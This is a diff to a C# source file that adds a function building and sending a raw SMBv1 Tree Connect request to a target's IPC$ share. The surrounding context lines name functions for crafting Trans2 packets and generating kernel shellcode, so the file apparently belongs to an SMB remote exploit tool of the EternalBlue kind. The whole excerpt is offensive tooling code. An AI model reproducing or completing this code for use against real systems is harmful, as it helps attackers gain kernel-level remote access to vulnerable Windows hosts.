@@ -172,6 +172,49 @@ static public byte[] MakeTrans2Packet(ushort TID, ushort UID, int time, byte[] p
             SendSMBMessage(sock, pkt, true);
             return ReceiveSMBMessage(sock);
         }
+    
+    static public byte[] TreeConnectAndXRequest(string target, Socket sock, ushort UID)
+        {
+            SMB_HEADER header = new SMB_HEADER
+            {
+                protocol = 0x424d53ff,
+                command = 0x75,
+                errorClass = 0x00,
+                _reserved = 0x00,
+                errorCode = 0x0000,
+                flags = 0x18,
+                flags2 = 0x2001,
+                PIDHigh = 0x0000,
+                SecurityFeatures = 0x0000000000000000,
+                reserved = 0x0000,
+                TID = 0xfeff,
+                PIDLow = 0x4b2f,
+                UID = UID,
+                MID = 0x5ec5
+            };
+            byte[] headerBytes = GetBytes(header);
+
+            SMB_COM_TREE_CONNECT_ANDX_REQUEST treeConnectAndxRequest = new SMB_COM_TREE_CONNECT_ANDX_REQUEST
+            {
+                WordCount = 0x04,
+                AndXCommand = 0xff,
+                AndXReserved = 0x00,
+                AndXOffset = 0x0000,
+                Flags = 0x0000,
+                PasswordLength = 0x0001,
+            };
+            byte[] PathServiceBytes = Encoding.ASCII.GetBytes(@"\\" + target + @"\IPC$" + "\0?????\0");
+            List<byte> SMBData = new List<byte>();
+            SMBData.Add(0x00); //Password
+            SMBData.AddRange(PathServiceBytes); //Path + Service
+            treeConnectAndxRequest.ByteCount = (ushort)SMBData.Count;
+
+            byte[] TreeConnectAndxRequestBytes = GetBytes(treeConnectAndxRequest).Concat(SMBData.ToArray()).ToArray();
+            byte[] pkt = headerBytes.Concat(TreeConnectAndxRequestBytes).ToArray();
+
+            SendSMBMessage(sock, pkt, true);
+            return ReceiveSMBMessage(sock);
+        }
 
 static public byte[] MakeKernelShellcode()
         {
